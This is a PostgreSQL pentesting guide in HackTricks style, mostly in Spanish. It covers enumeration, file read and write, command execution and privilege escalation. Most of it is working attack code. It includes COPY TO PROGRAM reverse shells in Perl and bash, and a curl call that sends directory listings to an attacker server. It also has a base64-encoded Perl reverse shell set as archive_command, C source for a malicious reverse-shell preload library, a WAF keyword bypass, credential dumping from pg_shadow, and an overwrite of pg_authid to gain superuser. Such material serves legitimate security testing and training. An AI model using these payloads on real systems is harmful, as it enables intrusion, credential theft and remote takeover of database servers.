# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Información básica**

**PostgreSQL** se describe como un **sistema de gestión de bases de datos objeto-relacional** que es **de código abierto**. Este sistema no solo utiliza el lenguaje SQL sino que además lo amplía con características adicionales. Sus capacidades le permiten manejar una amplia variedad de tipos de datos y operaciones, lo que lo convierte en una opción versátil para desarrolladores y organizaciones.

**Puerto por defecto:** 5432; si este puerto ya está en uso parece que postgresql usará el siguiente puerto (probablemente 5433) que no esté en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexión y enumeración básica
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`**, sabes que estás dentro de una base de datos **AWS postgresql**.

Para más información sobre **cómo abusar de una base de datos PostgreSQL** consulta:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Enumeración automática
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Según [**this research**](https://www.exploit-db.com/papers/13084), cuando un intento de conexión falla, `dblink` lanza una excepción `sqlclient_unable_to_establish_sqlconnection` que incluye una explicación del error. A continuación se muestran ejemplos de estos detalles.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host no responde

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port está cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- El puerto está abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
o
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- El puerto está abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
En funciones PL/pgSQL actualmente no es posible obtener detalles de las excepciones. Sin embargo, si tienes acceso directo al servidor PostgreSQL, puedes recuperar la información necesaria. Si extraer nombres de usuario y contraseñas de las tablas del sistema no es factible, puedes considerar utilizar el método de ataque por wordlist discutido en la sección anterior, ya que podría dar resultados positivos.

## Enumeración de privilegios

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                             |
| rolinherit     | El rol hereda automáticamente los privilegios de los roles de los que es miembro                                                                     |
| rolcreaterole  | El rol puede crear más roles                                                                                                                          |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                     |
| rolcanlogin    | El rol puede iniciar sesión. Es decir, este rol puede ser usado como el identificador de autorización de sesión inicial                              |
| rolreplication | El rol es un rol de replicación. Un rol de replicación puede iniciar conexiones de replicación y crear y eliminar slots de replicación.              |
| rolconnlimit   | Para roles que pueden iniciar sesión, esto establece el número máximo de conexiones concurrentes que puede hacer este rol. -1 significa sin límite.   |
| rolpassword    | No es la contraseña (siempre se muestra como `********`)                                                                                             |
| rolvaliduntil  | Tiempo de expiración de la contraseña (usado solo para autenticación por contraseña); null si no hay expiración                                      |
| rolbypassrls   | El rol omite todas las políticas de seguridad a nivel de fila, ver [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para más información. |
| rolconfig      | Valores predeterminados específicos del rol para variables de configuración en tiempo de ejecución                                                   |
| oid            | ID del rol                                                                                                                                            |

#### Grupos interesantes

- Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
- Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
- Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

> [!TIP]
> Ten en cuenta que en Postgres un **usuario**, un **grupo** y un **rol** son **lo mismo**. Todo depende de **cómo lo uses** y si **permites que inicie sesión**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones del sistema de archivos

### Leer directorios y archivos

A partir de este [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y los **super users** pueden usar el método **`COPY`** en cualquier ruta (revisa `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Recuerda que si no eres **superusuario** pero tienes el permiso **CREATEROLE** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Hay **otras funciones de postgres** que se pueden usar para **leer archivos o listar un directorio**. Solo **superusuarios** y **usuarios con permisos explícitos** pueden usarlas:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **más funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura simple de archivos

Solo los **super users** y los miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes los permisos **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Más info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
 
Recuerda que COPY no puede manejar caracteres de nueva línea, por lo tanto incluso si estás usando una carga útil base64 **debes enviar una sola línea**.\
Una limitación muy importante de esta técnica es que **`copy` cannot be used to write binary files as it modify some binary values.**

### **Binary files upload**

However, there are **other techniques to upload big binary files:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Updating PostgreSQL table data via local file write

If you have the necessary permissions to read and write PostgreSQL server files, you can update any table on the server by **overwriting the associated file node** in [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Required steps:

1.  Obtain the PostgreSQL data directory

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** Si no puedes obtener la ruta actual del directorio de datos desde settings, puedes consultar la versión principal de PostgreSQL mediante la consulta `SELECT version()` e intentar deducir la ruta. Las rutas comunes del directorio de datos en instalaciones Unix de PostgreSQL son `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nombre de cluster común es `main`.

2.  Obtain a relative path to the filenode, associated with the target table

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

This query should return something like `base/3/1337`. The full path on disk will be `$DATA_DIRECTORY/base/3/1337`, i.e. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Download the filenode through the `lo_*` functions

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Get the datatype, associated with the target table

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); set all `rol*` boolean flags to 1 for full permissions.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  You should now see updated table values in the PostgreSQL.

You can also become a superadmin by editing the `pg_authid` table. **See** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ejemplo para ejecutar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Recuerda que si no eres superuser pero tienes el permiso **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Más info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

O usa el módulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Más información sobre esta vulnerabilidad [**aquí**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque se reportó como CVE-2019-9193, Postges declaró que esto era una [característica y no será corregida](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Evadir filtros de palabras clave/WAF para alcanzar COPY PROGRAM

En contextos de SQLi con consultas apiladas, un WAF puede eliminar o bloquear la palabra clave literal `COPY`. Puedes construir dinámicamente la sentencia y ejecutarla dentro de un bloque PL/pgSQL DO. Por ejemplo, construye la C inicial con `CHR(67)` para eludir filtros ingenuos y EXECUTE el comando ensamblado:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE en el archivo de configuración de PostgreSQL

> [!TIP]
> Los siguientes vectores RCE son especialmente útiles en contextos de SQLi restringidos, ya que todos los pasos pueden realizarse mediante SELECT anidados

The **configuration file** of PostgreSQL is **writable** by the **postgres user**, which is the one running the database, so as **superuser**, you can write files in the filesystem, and therefore you can **overwrite this file.**

![](<../images/image (322).png>)

#### **RCE con ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

The configuration file have some interesting attributes that can lead to RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.

Then, an attacker will need to:

1. **Extraer la clave privada** del servidor
2. **Cifrar** la clave privada descargada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Volcar** la **configuración** actual de postgresql
5. **Sobrescribir** la **configuración** con la configuración de atributos mencionada:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

While testing this I noticed that this will only work if the **private key file has privileges 640**, it's **owned by root** and by the **group ssl-cert or postgres** (so the postgres user can read it), and is placed in _/var/lib/postgresql/12/main_.

#### **RCE con archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Another attribute in the configuration file that is exploitable is `archive_command`.

For this to work, the `archive_mode` setting has to be `'on'` or `'always'`. If that is true, then we could overwrite the command in `archive_command` and force it to execute via the WAL (write-ahead logging) operations.

The general steps are:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editar postgresql.conf mediante Large Objects (SQLi-friendly)

When multi-line writes are needed (e.g., to set multiple GUCs), use PostgreSQL Large Objects to read and overwrite the config entirely from SQL. This approach is ideal in SQLi contexts where `COPY` cannot handle newlines or binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

Más información [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- libraries that will be loaded by the PostgreSQL server at the client connection.
- `dynamic_library_path` -- list of directories where the PostgreSQL server will search for the libraries.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Descargar el `postgresql.conf` original
2. Incluir el directorio `/tmp/` en el valor de `dynamic_library_path`, p. ej. `dynamic_library_path = '/tmp:$libdir'`
3. Incluir el nombre de la biblioteca maliciosa en el valor de `session_preload_libraries`, p. ej. `session_preload_libraries = 'payload.so'`
4. Comprobar la versión mayor de PostgreSQL mediante la consulta `SELECT version()`
5. Compilar el código de la biblioteca maliciosa con el paquete dev de PostgreSQL correcto. Código de ejemplo:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Subir el `postgresql.conf` malicioso creado en los pasos 2-3 y sobrescribir el original
7. Subir el `payload.so` del paso 5 al directorio `/tmp`
8. Recargar la configuración del servidor reiniciando el servidor o invocando la consulta `SELECT pg_reload_conf()`
9. En la siguiente conexión a la DB recibirás la conexión de reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

So, if you have **`CREATEROLE`** permission you could grant yourself access to other **roles** (that aren't superuser) that can give you the option to read & write files and execute commands:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar contraseña

Los usuarios con este rol también pueden **cambiar** las **contraseñas** de otros **usuarios que no son superusuarios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Es bastante común encontrar que **usuarios locales pueden iniciar sesión en PostgreSQL sin proporcionar ninguna contraseña**. Por lo tanto, una vez que hayas obtenido **permisos para ejecutar código** puedes abusar de estos permisos para otorgarte el rol **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Esto suele ser posible debido a las siguientes líneas en el archivo **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

En [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica cómo fue posible **privesc** en Postgres GCP abusando del privilegio ALTER TABLE que se concedió al usuario.

Cuando intentas **hacer que otro usuario sea propietario de una tabla** deberías obtener un **error** que lo impida, pero aparentemente GCP dio esa **opción al usuario postgres que no es superuser** en GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Uniendo esta idea con el hecho de que cuando se ejecutan los comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) en una **tabla con una función de índice**, la **función** es **llamada** como parte del comando con los permisos del **propietario de la tabla**. Es posible crear un índice con una función y asignar permisos de propietario a un **superuser** sobre esa tabla, y luego ejecutar ANALYZE en la tabla con la función maliciosa, que podrá ejecutar comandos porque está usando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Empieza creando una nueva tabla.
2. Inserta contenido irrelevante en la tabla para proporcionar datos a la función de índice.
3. Desarrolla una función de índice maliciosa que contenga un code execution payload, permitiendo que se ejecuten comandos no autorizados.
4. ALTER el propietario de la tabla a "cloudsqladmin", que es el rol de superusuario de GCP usado exclusivamente por Cloud SQL para gestionar y mantener la base de datos.
5. Realiza una operación ANALYZE sobre la tabla. Esta acción obliga al motor PostgreSQL a cambiar al contexto de usuario del propietario de la tabla, "cloudsqladmin". En consecuencia, la función de índice maliciosa se invoca con los permisos de "cloudsqladmin", habilitando así la ejecución del shell command previamente no autorizado.

En PostgreSQL, este flujo se ve algo así:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Entonces, la tabla `shell_commands_results` contendrá la salida del código ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Local Login

Algunas instancias de postgresql mal configuradas podrían permitir el login de cualquier usuario local; es posible hacer login desde 127.0.0.1 usando la **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Ten en cuenta que para que la consulta anterior funcione **la función `dblink` debe existir**. Si no existe, puedes intentar crearla con
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Si tienes la contraseña de un usuario con más privilegios, pero el usuario no tiene permitido iniciar sesión desde una IP externa, puedes usar la siguiente función para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible comprobar si esta función existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Función definida por el usuario con** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters pudieron privesc dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta función con el flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER is executed** with the privileges of the **user that owns it**. Therefore, if the function is **vulnerable to SQL Injection** or is doing some **privileged actions with params controlled by the attacker**, it could be abused to **escalate privileges inside postgres**.

En la línea 4 del código anterior puedes ver que la función tiene el flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Ejecutar Brute-force con PL/pgSQL

**PL/pgSQL** es un **lenguaje de programación con todas las funciones** que ofrece un mayor control procedimental en comparación con SQL. Permite el uso de **loops** y otras **estructuras de control** para mejorar la lógica del programa. Además, las **sentencias SQL** y los **triggers** pueden invocar funciones creadas con el **lenguaje PL/pgSQL**. Esta integración permite un enfoque más completo y versátil para la programación y la automatización de bases de datos.\
**Puedes abusar de este lenguaje para pedirle a PostgreSQL que haga brute-force de las credenciales de los usuarios.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc mediante la sobrescritura de tablas internas de PostgreSQL

> [!TIP]
> El siguiente vector de privesc es especialmente útil en contextos de SQLi restringidos, ya que todos los pasos pueden realizarse mediante sentencias SELECT anidadas

Si puedes **leer y escribir archivos del servidor PostgreSQL**, puedes **convertirte en superuser** sobrescribiendo el filenode en disco de PostgreSQL asociado con la tabla interna `pg_authid`.

Lee más sobre **esta técnica** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Obtain the PostgreSQL data directory
2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Usa el [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) para [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); establece todas las banderas booleanas `rol*` a 1 para permisos completos.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Opcionalmente)_ Limpia la caché de tablas en memoria ejecutando una consulta SQL costosa
8. Ahora deberías tener los privilegios de un superadmin completo.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Dentro del archivo _**postgresql.conf**_ puedes habilitar los logs de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
A continuación, **reinicia el servicio**.

### pgadmin

